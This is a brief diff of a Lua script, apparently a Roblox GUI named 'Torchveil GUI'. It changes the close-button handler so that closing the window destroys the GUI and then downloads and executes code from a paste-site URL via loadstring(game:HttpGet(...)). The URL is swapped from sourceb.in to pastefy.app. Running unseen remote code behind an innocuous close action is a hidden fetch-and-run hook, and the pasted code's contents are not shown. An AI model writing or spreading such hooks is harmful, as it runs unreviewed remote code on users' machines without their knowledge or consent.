@@ -117,7 +117,7 @@ end)
 closeButton.MouseButton1Click:Connect(function()
     screenGui:Destroy()
     task.wait(0.2) -- Small delay for smooth transition
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/hKkaHUXqOC/0"))()
+    loadstring(game:HttpGet("https://pastefy.app/Z4g0RhNe/raw"))()
 end)
 
 print("✅ Torchveil GUI Fully Updated & Loaded!")
